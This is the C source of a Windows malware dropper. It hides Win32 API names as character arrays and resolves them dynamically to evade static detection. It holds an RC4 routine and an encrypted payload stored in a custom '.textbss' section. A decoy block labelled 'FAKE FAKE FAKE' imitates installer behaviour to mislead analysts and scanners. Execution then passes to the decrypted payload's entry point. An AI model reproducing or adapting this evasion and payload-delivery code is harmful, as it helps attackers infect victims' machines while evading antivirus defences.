#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include "DropperCode.h"
#include "DropperHeader.h"

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

#pragma section(".textbss",read)
__declspec(allocate(".textbss"))
static ULONG pCooked[(1024*1024)/sizeof(ULONG)] = {0xdeadbeef};

GETMODULEHANDLE pfn_GetModuleHandle;
LOADLIBRARYA pfn_LoadLibraryA;
GETPROCADDRESS pfn_GetProcAddress;
VIRTUALALLOC pfn_VirtualAlloc;
VIRTUALFREE pfn_VirtualFree;
GETMODULEFILENAMEA pfn_GetModuleFileNameA;
GETENVIRONMENTVARIABLEA pfn_GetEnvironmentVariableA;
GETFILEATTRIBUTESA pfn_GetFileAttributesA;
CREATEDIRECTORYA pfn_CreateDirectoryA;
SETCURRENTDIRECTORYA pfn_SetCurrentDirectoryA;
SETFILEATTRIBUTESA pfn_SetFileAttributesA;
CREATEFILEA pfn_CreateFileA;
GETLASTERROR pfn_GetLastError;
WRITEFILE pfn_WriteFile;
CLOSEHANDLE pfn_CloseHandle;
FREELIBRARY pfn_FreeLibrary;
DELETEFILEA pfn_DeleteFileA;
SWPRINTF pfn_swprintf;
GETCURRENTPROCESSID pfn_GetCurrentProcessId;


VOID InitWinApi()
{
	HMODULE hKernel32, hNtDll;
	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', 0x0};
	CHAR strNtDll[] = { 'n', 't', 'd', 'l', 'l', 0x0};

	pfn_GetProcAddress = resolveGetProcAddress();
	pfn_LoadLibraryA = resolveLoadLibrary();	

	hKernel32 = pfn_LoadLibraryA(strKernel32);
	hNtDll = pfn_LoadLibraryA(strNtDll);

	CHAR strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0};
	pfn_VirtualAlloc = (VIRTUALALLOC)pfn_GetProcAddress(hKernel32, strVirtualAlloc);

	CHAR strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0};
	pfn_VirtualFree = (VIRTUALFREE)pfn_GetProcAddress(hKernel32, strVirtualFree);

	CHAR strGetModuleFileNameA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x0};
	pfn_GetModuleFileNameA = (GETMODULEFILENAMEA)pfn_GetProcAddress(hKernel32, strGetModuleFileNameA);

	CHAR strGetEnvironmentVariableA[] = { 'G', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'A', 0x0};
	pfn_GetEnvironmentVariableA = (GETENVIRONMENTVARIABLEA)pfn_GetProcAddress(hKernel32, strGetEnvironmentVariableA);

	CHAR strGetFileAttributesA[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0};
	pfn_GetFileAttributesA = (GETFILEATTRIBUTESA)pfn_GetProcAddress(hKernel32, strGetFileAttributesA);

	CHAR strCreateDirectoryA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0};
	pfn_CreateDirectoryA = (CREATEDIRECTORYA)pfn_GetProcAddress(hKernel32, strCreateDirectoryA);

	CHAR strSetCurrentDirectoryA[] = { 'S', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0};
	pfn_SetCurrentDirectoryA = (SETCURRENTDIRECTORYA)pfn_GetProcAddress(hKernel32, strSetCurrentDirectoryA);

	CHAR strSetFileAttributesA[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0};
	pfn_SetFileAttributesA = (SETFILEATTRIBUTESA)pfn_GetProcAddress(hKernel32, strSetFileAttributesA);

	CHAR strCreateFileA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0};
	pfn_CreateFileA = (CREATEFILEA)pfn_GetProcAddress(hKernel32, strCreateFileA);

	CHAR strGetLastError[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0x0};
	pfn_GetLastError = (GETLASTERROR)pfn_GetProcAddress(hKernel32, strGetLastError);

	CHAR strWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0};
	pfn_WriteFile = (WRITEFILE)pfn_GetProcAddress(hKernel32, strWriteFile);

	CHAR strCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0};
	pfn_CloseHandle = (CLOSEHANDLE)pfn_GetProcAddress(hKernel32, strCloseHandle);

	CHAR strFreeLibrary[] = { 'F', 'r', 'e', 'e', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 0x0 };
	pfn_FreeLibrary = (FREELIBRARY)pfn_GetProcAddress(hKernel32, strFreeLibrary);

	CHAR strDeleteFileA[] = { 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
	pfn_DeleteFileA = (DELETEFILEA)pfn_GetProcAddress(hKernel32, strDeleteFileA);

	CHAR strSwprintf[] = { 's', 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x0 };
	pfn_swprintf = (SWPRINTF)pfn_GetProcAddress(hNtDll, strSwprintf);

	CHAR strGetCurrentProcessId[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', 0x0 };
	pfn_GetCurrentProcessId = (GETCURRENTPROCESSID)pfn_GetProcAddress(hKernel32, strGetCurrentProcessId);

	CHAR strGetModuleHandle[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
	pfn_GetModuleHandle = (GETMODULEHANDLE)pfn_GetProcAddress(hKernel32, strGetModuleHandle);

}

DropperHeader *GetEofData(LPVOID FileBuffer)
{
	return (DropperHeader *)NULL;
}

void rc4_encrypt(
	const unsigned char *key, 
	size_t keylen, 
	size_t skip,
	unsigned char *data, 
	size_t data_len)
{
	unsigned int i, j, k;
	unsigned char *pos;
	size_t kpos;
		
	unsigned char *S = (unsigned char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
	
	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}
	
	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}
	
	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}

	pfn_VirtualFree(S, 0, MEM_RELEASE);
}



int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR    lpCmdLine,
	int       nCmdShow)
{
	InitWinApi();
	
	// FAKE FAKE FAKE
	if (pfn_GetCurrentProcessId() == 4)
	{
		STARTUPINFO sInfo;
		MessageBox(NULL, L"Launching installer", L"Installer", 0);

		GetStartupInfo(&sInfo);
		if (sInfo.dwFlags == 12)
		{
			HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetDesktopWindow, NULL, 0, NULL);

			RECT pRect;
			if (GetClientRect(GetDesktopWindow(), &pRect))
				MessageBox(NULL, L"Setting up window", L"Action succeded", 0);
		}

		ShowWindow(GetDesktopWindow(), SW_MAXIMIZE);

		VirtualFree(VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE), 0, MEM_RELEASE);
		if (GetLastError() == 123)
			MessageBox(NULL, L"Memory committed", L"Memory manager", 0);

		ULONG uVersion;
		LPWSTR pCmdLine = GetCommandLine();
		if (pCmdLine[0] != L'c')
		{
			uVersion = GetVersion();
			if (uVersion == 0x7812)
				ExitProcess(123);
		}

		SYSTEM_INFO pSysInfo;
		GetSystemInfo(&pSysInfo);
		if (pSysInfo.dwOemId = 0x62814)
			MessageBox(NULL, L"Uknown system detected", L"Compatibility check", 0);

		DWORD pDummy;
		if (RegQueryValueEx((HKEY)0x40, L"Start", &pDummy, 0, (LPBYTE)&pDummy, &pDummy) == ERROR_SUCCESS)
			MessageBox(NULL, L"Program already installed", L"Installer", 0);

		LCID pThreadLocale = GetThreadLocale();
		if (pThreadLocale == 12)
			MessageBox(NULL, L"Unsupported language", L"Error", 0);
	}
	// END FAKE FAKE FAKE

	DropperHeader *pDropperHeader = (DropperHeader *)pfn_VirtualAlloc(NULL, sizeof(pCooked), MEM_COMMIT, PAGE_READWRITE);
	_MEMCPY_(pDropperHeader, pCooked, sizeof(pCooked));
	DropperEntryPoint(pDropperHeader);
}

